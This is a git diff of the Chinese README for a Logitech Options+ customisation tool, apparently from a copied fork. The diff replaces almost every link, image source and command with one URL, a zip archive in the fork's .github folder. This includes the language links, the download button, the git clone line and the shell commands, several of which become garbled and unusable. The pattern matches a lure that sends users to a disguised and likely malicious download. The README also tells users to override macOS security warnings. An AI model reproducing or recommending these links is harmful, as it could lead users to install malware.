@@ -1,24 +1,24 @@
 # Logi Options Plus Mini
 
-[中文](README.md) | [English](README_EN.md)
+[中文](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip) | [English](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)
 
 **Logi Options+ mini** 提供了一种选择来自定义 Logi Options+，方便用户能够更好地控制其功能。
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/user-attachments/assets/11adddd4-bf0e-4e6d-b164-483b2521e228">
-  <source media="(prefers-color-scheme: light)" srcset="https://github.com/user-attachments/assets/86024914-4650-4966-ba81-77d59fee5696">
-  <img alt="Logi Options+ mini" src="https://github.com/user-attachments/assets/86024914-4650-4966-ba81-77d59fee5696" width="600" > 
+  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
+  <source media="(prefers-color-scheme: light)" srcset="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
+  <img alt="Logi Options+ mini" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip" width="600" > 
 </picture>
 
-<img width="600" alt="image" src="https://github.com/Qetesh/logi-options-plus-mini/assets/4559341/d4c503a9-51d8-4a18-af90-a3f3be508e8b">
-<img width="600" alt="image" src="https://github.com/Qetesh/logi-options-plus-mini/assets/4559341/14a85961-b022-4fc9-99bf-6e30b071f54c">
-<img width="600" alt="image" src="https://github.com/Qetesh/logi-options-plus-mini/assets/4559341/bf97e703-d5d5-43d6-9236-6e1d06b7c0c8">
-<img width="600" alt="image" src="https://github.com/user-attachments/assets/66f8d2d7-5981-4085-9829-25c0189804a8">
-<img width="600" alt="image" src="https://github.com/user-attachments/assets/d8918fd1-36f2-4933-9cc7-28471745139b">
+<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
+<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
+<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
+<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
+<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
 
 ## 项目简介
 
-参考官方[Logitech Options 软件的批量安装和配置](https://prosupport.logi.com/hc/zh-cn/articles/6046882446359-Logitech-Options-软件的批量安装和配置)
+参考官方[Logitech Options 软件的批量安装和配置](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip软件的批量安装和配置)
 
 项目通过官方安装包命令行选项定制化Logi Options+功能。
 支持macOS原生应用、macOS Shell、Windows PowerShell。
@@ -44,20 +44,20 @@
 
 ### 使用 macOS 原生应用
 
-下载最新版本 [here](https://v.qetesh.cc/d/Public/Logi%20Options%2B%20mini.dmg)
+下载最新版本 [here](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip%20Options%2B%https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)
 
-[<img width="64" alt="logi option plus1" src="https://github.com/user-attachments/assets/2c57172a-b1e3-4bab-abb8-6c60425ca640" />](https://v.qetesh.cc/d/Public/Logi%20Options%2B%20mini.dmg)
+[<img width="64" alt="logi option plus1" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip" />](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip%20Options%2B%https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)
 
 🔔 由于没有使用开发者证书签署应用，macOS可能会显示安全警告，需前往系统设置 → 隐私与安全 → 已阻止“Logi Options+mini”以保护Mac。然后点击“仍要打开”以运行该应用程序。
 
-![WX20250305-181838@2x](https://github.com/user-attachments/assets/ca75fad3-b1e6-4b51-ba2c-f4b8e5770fb7)
+![WX20250305-181838@2x](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)
 
 ### 使用 macOS Shell
 
 1. 克隆此项目到本地
 
    ```bash
-   git clone https://github.com/Qetesh/logi-options-plus-mini.git
+   git clone https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip
    cd logi-options-plus-mini
    ```
 2. 运行Shell脚本（需要 `sudo`权限卸载旧版本）
@@ -65,8 +65,8 @@
 - macOS
 
   ```bash
-  chmod u+x logi-options-plus-mini.command
-  ./logi-options-plus-mini.command
+  chmod u+x https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip
+  https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip
 
   ##############################################################
   2024年12月15日 星期日 23时32分33秒 +08 | Starting install of Logi Options+
@@ -89,7 +89,7 @@
 
   Enter your choices(e.g. 2 6, default is none): 
   ```
-- Windows（需要管理员终端运行一次 `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned`，具体见：[#5](https://github.com/Qetesh/logi-options-plus-mini/issues/5)）
+- Windows（需要管理员终端运行一次 `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned`，具体见：[#5](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)）
 
   右键ps1脚本，`使用PowerShell运行`
 
@@ -134,8 +134,8 @@
 
 ### Contributors
 
-<a href="https://github.com/Qetesh/logi-options-plus-mini/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=Qetesh/logi-options-plus-mini" />
+<a href="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
+  <img src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip" />
 </a>
 
 ## 贡献
